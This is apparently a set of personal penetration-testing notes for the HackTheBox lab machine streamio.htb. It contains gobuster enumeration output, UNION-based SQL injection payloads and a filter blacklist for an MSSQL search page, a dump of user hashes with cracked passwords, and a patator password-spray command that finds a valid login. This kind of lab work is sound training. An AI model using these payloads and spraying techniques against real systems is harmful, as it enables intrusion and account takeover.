## Todos

- [ ] Port 80
	- [ ] Purpose
	- [ ] Backend
	- [ ] Path discovery
	- [ ] Virtual host discovery
	- [ ] Auth?
	- [ ] Input analysis
- [ ] Port 443 `streamio.htb`
	- [x] Purpose
	- [x] Backend
	- [ ] Path discovery
		- [ ] `/admin`: access with normal login or do I need to be an administrator to access? 
		- [ ] `/images/`
		- [x] `/login.php`
		- [x] `/register.php`
		- [x] `/contact.php`
		- [x] `/about.php`
		- [ ] `/logout.php`
	- [x] Virtual host discovery
	- [x] Auth?
	- [ ] Input analysis
	- [ ] Potential usernames
		- [ ] `oliver`
		- [ ] `barry`
		- [ ] `samantha`
- [ ] Port 443 `watch.streamio.htb`
	- [x] Purpose
	- [x] Backend
	- [ ] Path discovery
		- [x] /index.php
		- [ ] `/search.php`
		- [ ] `/blocked.php`
	- [x] Virtual host discovery
	- [x] Auth?
	- [x] Input analysis

## `https://streamio.htb`

### Purpose

The website for StreamIO, a streaming service.

### Backend

Microsoft IIS
PHP
ASP.NET

#### Path Discovery

```bash
$ gobuster dir -u https://streamio.htb -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt -x php
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://streamio.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
2022/11/19 17:19:49 Starting gobuster in directory enumeration mode
===============================================================
/admin                (Status: 301) [Size: 150] [--> https://streamio.htb/admin/]
/images               (Status: 301) [Size: 151] [--> https://streamio.htb/images/]
/js                   (Status: 301) [Size: 147] [--> https://streamio.htb/js/]
/login.php            (Status: 200) [Size: 4145]
/index.php            (Status: 200) [Size: 13497]
/css                  (Status: 301) [Size: 148] [--> https://streamio.htb/css/]
/register.php         (Status: 200) [Size: 4500]
/contact.php          (Status: 200) [Size: 6434]
/logout.php           (Status: 302) [Size: 0] [--> https://streamio.htb/]
/about.php            (Status: 200) [Size: 7825]
/.                    (Status: 200) [Size: 13497]
/fonts                (Status: 301) [Size: 150] [--> https://streamio.htb/fonts/]

===============================================================
2022/11/19 17:23:13 Finished
===============================================================
```

##### `/admin/`

Returns 403.

##### `/register.php`

Created an account but I can't log in afterwards. I'm thinking this doesn't actually do anything.

### Virtual Host Discovery

Nothing new.

```bash
$ gobuster vhost -k -u https://streamio.htb -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:          https://streamio.htb
[+] Method:       GET
[+] Threads:      10
[+] Wordlist:     /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt
[+] User Agent:   gobuster/3.1.0
[+] Timeout:      10s
===============================================================
2022/11/19 17:34:11 Starting gobuster in VHOST enumeration mode
===============================================================
Found: watch.streamio.htb (Status: 200) [Size: 2829]

===============================================================
2022/11/19 17:35:10 Finished
===============================================================
```

## `https://watch.streamio.htb`

### Purpose

Seems to be the backend streaming engine for the StreamIO company.

### Backend

IIS
PHP
Maybe ASP?

### Path Discovery

```bash
$ gobuster dir -k -u https://watch.streamio.htb -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt -x asp,aspx,php
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://watch.streamio.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              asp,aspx,php
[+] Timeout:                 10s
===============================================================
2022/11/19 17:41:38 Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 2829]
/search.php           (Status: 200) [Size: 253887]
/static               (Status: 301) [Size: 157] [--> https://watch.streamio.htb/static/]
/.                    (Status: 200) [Size: 2829]
/blocked.php          (Status: 200) [Size: 677]

===============================================================
2022/11/19 17:48:00 Finished
===============================================================
```

#### `/search.php`

Doesn't appear to be SQL injectable.

```sql
SELECT name,release_date FROM movies WHERE name LIKE '%$INJECT%'
```

```sql
SELECT name,release_date FROM movies WHERE name LIKE '%$INJECT%'
```

```sql
SELECT name,release_date FROM movies WHERE name LIKE '%500%'--%'
```

`500%' ORDER BY 1-- -`

```sql
SELECT * FROM movies WHERE name LIKE '%500%' UNION SELECT 1,2,3,4,5,6-- -'
```

```sql
SELECT * FROM movies WHERE name LIKE '%500' UNION SELECT 1,2,3,4,5,6-- -'
```

Blacklist strings (case insensitive):

- `ORDER`
- `NULL`
- `/**/`

Backend DBMS is MSSQL.

```txt
Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64) 
	Sep 24 2019 13:48:23 
	Copyright (C) 2019 Microsoft Corporation
	Express Edition (64-bit) on Windows Server 2019 Standard 10.0 <X64> (Build 17763: ) (Hypervisor)
```

Databases:

- `master`
- `model`
- `msdb`
- `tempdb`
- `STREAMIO`
	- `movies`
	- `users`
		- `id`
		- `is_staff`
		- `password`
		- `username`
- `streamio_backup`

#### Cracked Credentials from `STREAMIO.users`

```txt
admin:665a50ac9eaa781e4f7f04199db97a11:paddpadd
Alexendra:1c2b3d8270321140e5153f6637d3ee53
Austin:0049ac57646627b8d7aeaccf8b6a936f
Barbra:3961548825e3e21df5646cafe11c6c76
Barry:54c88b2dbd7b1a84012fabc1a4c73415:$hadoW
Baxter:22ee218331afd081b0dcd8115284bae3
Bruno:2a4e2cf22dd8fcb45adcb91be1e22ae8:$monique$1991$
Carmon:35394484d89fcfdb3c5e447fe749d213
Clara:ef8f3d30a856cf166fb8215aca93e9ff:%$clara
Diablo:ec33265e5fc8c2f1b0c137bb7b3632b5
Garfield:8097cedd612cc37c29db152b6e9edbd3
Gloria:0cfaaaafb559f081df2befbe66686de0
James:c660060492d9edcaa8332d89c99c9239
Juliette:6dcd87740abb64edfa36d170f0d5450d:$3xybitch
Lauren:08344b85b329d7efd611b7a7743e8a09:##123a8j8w5123##
Lenord:ee0b8a0937abd60c2882eacb2f8dc49f:physics69i
Lucifer:7df45a9e3de3863807c026ba48e55fb3
Michelle:b83439b16f844bd6ffe35c02fe21b3c0:!?Love?!123
Oliver:fd78db29173a5cf701bd69027cb9bf6b
Robert:f03b910e2bd0313a23fdd7575f34a694
Robin:dc332fb5576e9631c9dae83f194f8e70
Sabrina:f87d3c0d6c8fd686aacc6627f1f493a5:!!sabrina$
Samantha:083ffae904143c4796e464dac33c1f7d
Stan:384463526d288edcc95fc3701e523bc7
tgihf:6f1ed002ab5595859014ebf0951522d9:blah
Thane:3577c47eb1e12c8ba021611e1280753c:highschoolmusical
Theodore:925e5408ecb67aea449373d668b7359e
Victor:bf55e15b119860a6e6b5a164377da719
Victoria:b22abb47a02b52d5dfa27fb0b534f693:!5psycho8!
William:d62be0dc82071bccc1322d64ec5b6c51
yoshihide:b779ba15cedfd22a023c4d8bcf5f2332:66boysandgirls..
```

Spray passwords against login form.

```bash
$ patator http_fuzz method=POST url=https://streamio.htb/login.php body='username=COMBO00&password=COMBO01' 0=creds.txt -x ignore:fgrep='Login failed'
13:14:33 patator    INFO - Starting Patator 0.9 (https://github.com/lanjelot/patator) with python-3.9.8 at 2022-11-20 13:14 EST
13:14:33 patator    INFO -
13:14:33 patator    INFO - code size:clen       time | candidate                          |   num | mesg
13:14:33 patator    INFO - -----------------------------------------------------------------------------
13:14:34 patator    INFO - 302  4537:4145      0.030 | yoshihide:66boysandgirls..         |    13 | HTTP/2 302
13:14:34 patator    INFO - Hits/Done/Skip/Fail/Size: 1/13/0/0/13, Avg: 21 r/s, Time: 0h 0m 0s
```

The credential `yoshihide:66boysandgirls..` works. Visit `/admin/` once authenticated.



### Virtual Host Discovery

```bash
$ gobuster vhost -k -u https://watch.streamio.htb -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:          https://watch.streamio.htb
[+] Method:       GET
[+] Threads:      10
[+] Wordlist:     /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt
[+] User Agent:   gobuster/3.1.0
[+] Timeout:      10s
===============================================================
2022/11/19 17:51:40 Starting gobuster in VHOST enumeration mode
===============================================================

===============================================================
2022/11/19 17:52:42 Finished
===============================================================
```